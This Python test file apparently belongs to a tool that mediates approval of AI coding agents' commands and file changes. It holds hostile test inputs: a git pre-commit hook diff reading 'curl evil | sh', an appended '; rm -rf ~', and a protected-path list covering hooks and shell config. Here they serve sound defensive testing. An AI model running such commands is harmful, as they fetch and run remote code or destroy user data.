    assert [a["result"]["decision"] for a in _answers(disk.log)] == [
        "acceptForSession", "accept", "accept", "decline", "accept"]


def test_what_may_run_set_back_to_never_declines_what_waits_and_what_comes(lab, disk, monkeypatch):
    f = _asking(lab, disk)
    script_agent(monkeypatch, disk.log, ask=[{"command": BUILD}, {"command": "make"}])
    _say(lab.owner, f.page, "Rebuild.")
    _waiting(lab, f.page)
    assert _patch(lab.owner, f.id, 200, agent_runs="never")["agent"]["runs"] == "never"
    assert runner.wait_idle(60)
    reply = _reply(lab, f.page)
    # the card went, the agent heard a decline, and the next ask was declined unseen; the turn went on
    assert (reply["state"], reply["text"], reply["asks"]) == ("done", "Did not run it.", [])
    assert reply["steps"] == [{"id": "ap0", "kind": "run", "status": "declined", "program": "latexmk"},
                              {"id": "ap1", "kind": "run", "status": "failed", "program": "make"}]
    assert [a["result"] for a in _answers(disk.log)] == [{"decision": "decline"}, {"decision": "decline"}]
    assert _steers(disk.log) == [f"Gamma declined that: {runner.RUNS_NEVER}"] * 2

    # Allow in this chat that lands once what may run is never, or the agent is another: no grant
    for meanwhile in (lambda: store.set_runs(f.id, "never", by=lab.user),
                      lambda: (store.set_agent(f.id, "claude", by=lab.user), store.set_runs(f.id, "ask", by=lab.user))):
        store.set_agent(f.id, "codex", by=lab.user)
        store.set_runs(f.id, "ask", by=lab.user)
        script_agent(monkeypatch, disk.log, ask=[{"command": BUILD}])
        made = _say(lab.owner, f.page, "Rebuild again.")
        [card] = _waiting(lab, f.page)["asks"]
        meanwhile()
        _answer(lab.owner, made["turn"]["id"], card["id"], decision="chat")
        assert runner.wait_idle(60)
        assert not store.granted(made["conversation"]["id"], BUILD, link_id=f.id)


def test_codex_input_to_a_terminal_and_a_protected_change_are_declined_unasked(work, monkeypatch):
    script_agent(monkeypatch, work.log, ask=[{"command": "python -i", "kind": "writeStdin"},
                                             {"command": BUILD, "kind": "humanCommand"},
                                             {"path": ".git/hooks/pre-commit", "diff": "curl evil | sh\n"},
                                             {"path": ".gitconfig", "change": "add", "diff": "[core]\n"},
                                             {"command": BUILD}])
    turn = events.start("codex", argv=ARGV["codex"], cwd=str(work.root), prompt=_chat_prompt(), ask=True)
    got = _reading(turn)
    asked = _until(lambda: next((e for e in got if e["type"] == "ask"), None))
    assert (asked["id"], asked["command"]) == ("104", BUILD)
    assert turn.answer("104", "once")
    assert _ended(got)["ok"]
    assert [e for e in got if e["type"] == "ask"] == [asked]  # nothing else reached the person
    assert [(a["id"], a["result"]) for a in _answers(work.log)] == [
        (100, {"decision": "decline"}), (101, {"decision": "decline"}), (102, {"decision": "decline"}),
        (103, {"decision": "decline"}), (104, {"decision": "accept"})]
    failed = {(e["id"], e.get("path") or e.get("command")) for e in got
              if e["type"] == "tool" and e["status"] == "failed"}
    assert {("ap0", "python -i"), ("ap2:0", ".git/hooks/pre-commit"), ("ap3:0", ".gitconfig")} <= failed
    # the rule both drivers share
    root = str(work.root)
    for path in (".git/hooks/pre-commit", "sub/.git/config", ".VSCode/settings.json", ".claude/settings.json",
                 ".codex/config.toml", ".husky/pre-push", ".idea/x.xml", ".gitconfig", ".bashrc", ".latexmkrc",
                 str(work.root / ".zshrc")):
        assert events.protected(path, root), path
    for path in ("main.tex", "sections/.hidden.tex", "../.bashrc", ".", str(work.root.parent / ".profile")):
        assert not events.protected(path, root), path
    assert claude.CHANGE_REFUSED == events.CHANGE_REFUSED


def test_a_file_changes_diff_names_each_change_and_is_cut_at_a_line(work):
    root = work.root
    changes = [{"path": str(root / "new.tex"), "kind": {"type": "add"}, "diff": "a\nb\n"},
               {"path": str(root / "old.tex"), "kind": {"type": "delete"}, "diff": "x"},
               {"path": str(root / "main.tex"), "kind": {"type": "update", "move_path": None},
                "diff": "@@ -1 +1 @@\n-a\n+b\n"},
               {"path": str(root / "a.tex"), "kind": {"type": "update", "move_path": str(root / "b.tex")},
                "diff": "@@ -1 +1 @@\n-c\n+d"}]
    assert codex._diff(changes, str(root)) == (
        "--- /dev/null\n+++ b/new.tex\n+a\n+b\n"
        "--- a/old.tex\n+++ /dev/null\n-x\n"
        "--- a/main.tex\n+++ b/main.tex\n@@ -1 +1 @@\n-a\n+b\n"
        "--- a/a.tex\n+++ b/b.tex\n@@ -1 +1 @@\n-c\n+d\n")
    long = "".join(f"+line {i:05}\n" for i in range(3000))
    cut = events.cut_diff(long)
    kept, last = cut.rsplit("\n", 1)
    assert len(cut) <= events.MAX_DIFF and long.startswith(kept + "\n")
    assert last == f"… (cut: {len(long) - len(kept) - 1} more characters)"
    assert events.ask("1", "files", paths=[], diff=long)["diff"] == cut and events.cut_diff("a\n") == "a\n"
    assert events.cut_diff("x" * 30_000).endswith("\n… (cut: 10040 more characters)")


def test_claude_codes_ask_turn_runs_each_command_in_the_folder(work, monkeypatch):
    monkeypatch.delenv("CLAUDE_BASH_MAINTAIN_PROJECT_WORKING_DIR", raising=False)
    assert claude.ASK_ENV == {"CLAUDE_BASH_MAINTAIN_PROJECT_WORKING_DIR": "1"}
    script_agent(monkeypatch, work.log, ask=[{"command": BUILD}])
    turn = events.start("claude", argv=ARGV["claude"], cwd=str(work.root), prompt=_chat_prompt(), ask=True)
    got = _reading(turn)
    assert _until(lambda: next((e for e in got if e["type"] == "ask"), None))["cwd"] == "."
    assert turn.answer("req-0", "once") and _ended(got)["ok"]
    script_agent(monkeypatch, work.log)
    assert list(events.start("claude", argv=ARGV["claude"], cwd=str(work.root), prompt=_chat_prompt())
                .events())[-1]["ok"]
    asked, plain = [e["env"] for e in read_log(work.log) if "env" in e]
    assert "CLAUDE_BASH_MAINTAIN_PROJECT_WORKING_DIR" in asked
    assert "CLAUDE_BASH_MAINTAIN_PROJECT_WORKING_DIR" not in plain
    assert "CLAUDE_BASH_MAINTAIN_PROJECT_WORKING_DIR" not in procs.child_env()  # this driver's alone


# --- what an ask shows, what Gamma reads of it, and its caps (step 5b) ----------------------------------

def test_shown_text_marks_what_does_not_show():
    for ch in ("\u202e", "\u2066", "\u2067", "\u2068", "\u2069", "\u200b", "\ufeff", "\u2028", "\u2029", "\x00", "\r",
               "\x1b"):
        assert events.shown_text(f"a{ch}b") == (f"a⟨U+{ord(ch):04X}⟩b", 1), repr(ch)
    assert events.shown_text("make\n\tall é 中") == ("make\n\tall é 中", 0)   # a newline and a tab show
    assert events.shown_text("") == ("", 0)


def test_host_ok():
    for host in ("example.org", "ctan.org:443", "10.0.0.1", "10.0.0.1:8080", "[::1]", "[2001:db8::1]:443", "localhost"):
        assert events.host_ok(host), host
    for host in ("", "evil example", "a/b", "[::1", "[nothex]", "x:99999", "x:0", "é.org", "x" * 254, "a\u202eb"):
        assert not events.host_ok(host), host


def test_unwrap_shell_gives_the_inner_command_only_on_a_round_trip():
    ps = r'"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"'
    assert events.unwrap_shell(f"{ps} -Command 'latexmk -pdf main.tex'") == ("PowerShell", "latexmk -pdf main.tex")
    assert events.unwrap_shell("pwsh -NoProfile -NoLogo -Command 'echo ''it''s'''") == ("PowerShell", "echo 'it's'")
    assert events.unwrap_shell("bash -lc 'make figures'") == ("bash", "make figures")
    assert events.unwrap_shell("/bin/zsh -c 'echo '\\''hi'\\'''") == ("zsh", "echo 'hi'")
    assert events.unwrap_shell("sh -c 'echo '\"'\"'hi'\"'\"''") == ("sh", "echo 'hi'")
    assert events.unwrap_shell("bash -lc 'printf \"%s\" `date` $(id)\nmake'") == (
        "bash", 'printf "%s" `date` $(id)\nmake')
    for command in (f"{ps} -Command 'latexmk' ; rm -rf ~",          # an argument after it
                    f"{ps} -Command 'a'b'",                          # a lone quote: not PowerShell's quoting
                    f"{ps} -Command 'echo \u2018hi\u2019'",          # a quote PowerShell reads as one
                    "bash -lc 'make' extra", "bash -lc 'make''x'", 'bash -lc "make"', "bash -x -c 'make'",
                    "bash -lc 'make\u202e'",                         # a body with a character that would not show
                    "python -c 'print(1)'", "latexmk -pdf main.tex", "", "bash -lc ''", "pwsh -Command ''"):
        assert events.unwrap_shell(command) is None, command


def test_program_names_what_unwrap_shell_gives():
    assert runner._program("pwsh -NoProfile -Command 'latexmk -pdf main.tex'") == "latexmk"
    assert runner._program("bash -lc 'echo '\\''hi'\\'' && make'") == "echo"
    assert runner._program("cmd /d /c \"python build.py\"") == "python"   # no round trip: its own reading


def test_claude_code_allows_the_command_alone_in_the_foreground(work, monkeypatch):
    script_agent(monkeypatch, work.log, ask=[{"command": BUILD, "description": "Build the PDF", "background": True,
                                              "timeout": 60000, "extra": "anything"}])
    turn = events.start("claude", argv=ARGV["claude"], cwd=str(work.root), prompt=_chat_prompt(), ask=True)
    got = _reading(turn)
    asked = _until(lambda: next((e for e in got if e["type"] == "ask"), None))
    assert (asked["command"], asked["background"]) == (BUILD, True)
    assert turn.answer("req-0", "once") and _ended(got)["ok"]
    assert _answers(work.log)[0]["response"]["response"] == {
        "behavior": "allow", "updatedInput": {"command": BUILD, "description": "Build the PDF", "timeout": 60000},
        "toolUseID": "toolu_ask0"}                                     # never run_in_background, nor anything else
    assert claude.allowed_input({"command": 5, "description": 1, "timeout": True}) == {"command": "5"}


def test_gammas_declines_are_worded_as_gammas(work, monkeypatch):
    script_agent(monkeypatch, work.log, ask=[{"command": BUILD}])
    turn = events.start("codex", argv=ARGV["codex"], cwd=str(work.root), prompt=_chat_prompt(), ask=True)
    got = _reading(turn)
    _until(lambda: any(e["type"] == "ask" for e in got))
    assert turn.answer("100", "deny", runner.TOO_LONG, by="gamma")
    _ended(got)
    assert _steers(work.log) == [f"Gamma declined that: {runner.TOO_LONG}"]
    work.log.unlink()
    turn = events.start("claude", argv=ARGV["claude"], cwd=str(work.root), prompt=_chat_prompt(), ask=True)
    got = _reading(turn)
    _until(lambda: any(e["type"] == "ask" for e in got))
    assert turn.answer("req-0", "deny", runner.TOO_LONG, by="gamma")
    _ended(got)
    assert _answers(work.log)[0]["response"]["response"]["message"] == f"Gamma declined: {runner.TOO_LONG}"


def test_a_file_change_with_grant_root_is_declined_unseen(lab, disk, monkeypatch):
    f = _asking(lab, disk)
    script_agent(monkeypatch, disk.log, ask=[{"path": "main.tex", "diff": "+x\n", "grant_root": str(f.root)},
                                             {"command": BUILD}])
    made = _say(lab.owner, f.page, "Change the title, then rebuild.")
    [card] = _waiting(lab, f.page)["asks"]
    assert card["kind"] == "command"                                   # the file change never reached the person
    _answer(lab.owner, made["turn"]["id"], card["id"], decision="once")
    assert runner.wait_idle(60)
    assert _steers(disk.log) == [f"Gamma declined that: {runner.ONE_AT_A_TIME}"]
    assert [a["result"] for a in _answers(disk.log)] == [{"decision": "decline"}, {"decision": "accept"}]


def test_a_card_marks_what_would_not_show_and_names_a_wrappers_command(lab, disk, monkeypatch):
    f = _asking(lab, disk)
    wrapped, hidden = "pwsh -Command 'latexmk -pdf main.tex'", "make\u202e all\nmake clean"
    script_agent(monkeypatch, disk.log, ask=[{"command": wrapped}, {"command": hidden}])
    made = _say(lab.owner, f.page, "Rebuild.")
    seen = set()
    card = _next_card(lab, f.page, seen)
    assert (card["command"], card["shell"], card["inner"]) == (wrapped, "PowerShell", "latexmk -pdf main.tex")
    assert "marked" not in card and "lines" not in card and "command_shown" not in card
    assert _reply(lab, f.page)["steps"][0]["program"] == "latexmk"
    _answer(lab.owner, made["turn"]["id"], card["id"], decision="deny")
    card = _next_card(lab, f.page, seen)
    assert (card["command"], card["command_shown"], card["marked"], card["lines"]) == (
        hidden, "make⟨U+202E⟩ all\nmake clean", 1, 2)
    assert "inner" not in card
    _answer(lab.owner, made["turn"]["id"], card["id"], decision="deny")
    assert runner.wait_idle(60)


def test_a_turn_holds_at_most_twenty_asks_and_three_declines_in_a_row(lab, disk, monkeypatch):
    f = _asking(lab, disk)
    monkeypatch.setattr(runner, "MAX_ASKS", 2)
    script_agent(monkeypatch, disk.log, ask=[{"command": f"make t{n}"} for n in range(3)])
    made, seen = _say(lab.owner, f.page, "Make them."), set()
    for _ in range(2):
        _answer(lab.owner, made["turn"]["id"], _next_card(lab, f.page, seen)["id"], decision="once")
    assert runner.wait_idle(60)
    assert _steers(disk.log) == [f"Gamma declined that: {runner.ASKED_TOO_OFTEN}"]
    monkeypatch.setattr(runner, "MAX_ASKS", 20)
    script_agent(monkeypatch, disk.log, ask=[{"command": f"make u{n}"} for n in range(4)])
    made = _say(lab.owner, f.page, "Make the others.")
    for _ in range(3):
        _answer(lab.owner, made["turn"]["id"], _next_card(lab, f.page, seen)["id"], decision="deny")
    assert runner.wait_idle(60)
    assert _steers(disk.log)[-1] == f"Gamma declined that: {runner.DECLINED_OFTEN}"
    assert len(seen) == 5                                              # the fourth never reached the person
